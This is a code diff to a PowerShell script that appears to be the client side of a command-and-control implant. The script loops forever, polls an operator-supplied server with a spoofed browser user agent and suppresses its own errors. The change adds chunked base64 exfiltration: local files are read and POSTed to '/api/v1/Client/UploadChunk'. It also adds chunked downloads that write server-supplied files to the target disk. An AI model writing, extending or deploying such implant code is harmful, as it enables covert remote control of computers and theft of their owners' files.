@@ -11,6 +11,7 @@ $server = $args[1] ; $sleeps = $args[3]
 $userAgent = "Mozilla/6.4 (Windows NT 11.1) Gecko/2010102 Firefox/99.0"
 $pwshversion = [int]$PSVersionTable.PSVersion.Major
 $redirectors = "6>&1 5>&1 4>&1 3>&1"
+$chunk_size = 65536
 
 # Help
 if (($args[0] -like "-h*") -or ($args[1] -eq $null)){
@@ -47,7 +48,7 @@ function R64Decoder {
    if ($args[0] -eq "-t") {
       $revb64 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($base64)) 2> $null }
    if ($args[0] -eq "-f") {
-      $revb64 = [System.Convert]::FromBase64String($base64) } return $revb64 }
+      $revb64 = [System.Convert]::FromBase64String($base64) } return ,$revb64 }
 
 function Send-HttpRequest {
    param ([string]$url, [string]$method, [string]$body)
@@ -79,16 +80,50 @@ while ($true) {
 
    if ($invoke64 -like "upload*") {
       $file_path = $invoke64.toString().Split("!")[1] ; $invoke64 = $null
-      if ($file_path -notlike "*:*") { $file_path = [string]$pwd + "\" + [string]$file_path }
-      $download = $($file_content = Send-HttpRequest "$server/api/v1/Client/Download" "GET") 2> $null
-      $file_content = $(R64Decoder -f $file_content.ToString().Split(" ")[-1]) 2> $null
-      [IO.File]::WriteAllBytes("$file_path", $file_content) 2> $null }
+      if (-not [IO.Path]::IsPathRooted($file_path)) { $file_path = [string]$pwd + [string][IO.Path]::DirectorySeparatorChar + [string]$file_path }
+      $chunk_index = 0
+      $chunk_builder = New-Object System.Text.StringBuilder
+      while ($true) {
+         $download = $(Send-HttpRequest "$server/api/v1/Client/DownloadChunk?index=$chunk_index" "GET") 2> $null
+         if ($download -eq "FileChunkDone") { break }
+         if ($download -like "FileChunk:*") {
+            $chunk_parts = $download.ToString().Split(":", 4)
+            if ($chunk_parts.Length -lt 4) { break }
+            $is_last = $chunk_parts[2]
+            $chunk_payload = $chunk_parts[3]
+            [void]$chunk_builder.Append($chunk_payload)
+            if ($is_last -eq "1") { break }
+            $chunk_index += 1
+         }
+         else { break }
+      }
+      $encoded_chunks = $chunk_builder.ToString()
+      if ($encoded_chunks -eq "") {
+         [IO.File]::WriteAllBytes("$file_path", [byte[]]@()) 2> $null
+      }
+      else {
+         $file_content = $(R64Decoder -f $encoded_chunks) 2> $null
+         [IO.File]::WriteAllBytes("$file_path", $file_content) 2> $null
+      } }
 
    if ($invoke64 -like "download*") {
       $file_path = $invoke64.toString().Split(" ",2)[1].Split("!")[0] ; $invoke64 = $null
-      if ($file_path -notlike "*:*") { $file_path = [string]$pwd + "\" + [string]$file_path }
+      if (-not [IO.Path]::IsPathRooted($file_path)) { $file_path = [string]$pwd + [string][IO.Path]::DirectorySeparatorChar + [string]$file_path }
       $file_content = $(R64Encoder -f "$file_path") 2> $null
-      $upload = $(Send-HttpRequest "$server/api/v1/Client/Upload" "POST" "File: $file_content") 2> $null }
+      if ($file_content -eq $null) { $file_content = "" }
+      if ($file_content.Length -eq 0) {
+         $upload = $(Send-HttpRequest "$server/api/v1/Client/UploadChunk" "POST" "Chunk:0:1:") 2> $null
+      }
+      else {
+         for ($offset = 0; $offset -lt $file_content.Length; $offset += $chunk_size) {
+            $chunk_index = [int]($offset / $chunk_size)
+            $count = [Math]::Min($chunk_size, $file_content.Length - $offset)
+            $chunk_payload = $file_content.Substring($offset, $count)
+            $is_last = 0
+            if (($offset + $count) -ge $file_content.Length) { $is_last = 1 }
+            $upload = $(Send-HttpRequest "$server/api/v1/Client/UploadChunk" "POST" "Chunk:${chunk_index}:${is_last}:${chunk_payload}") 2> $null
+         }
+      } }
 
    if ($invoke64 -eq "exit") { exit }
 
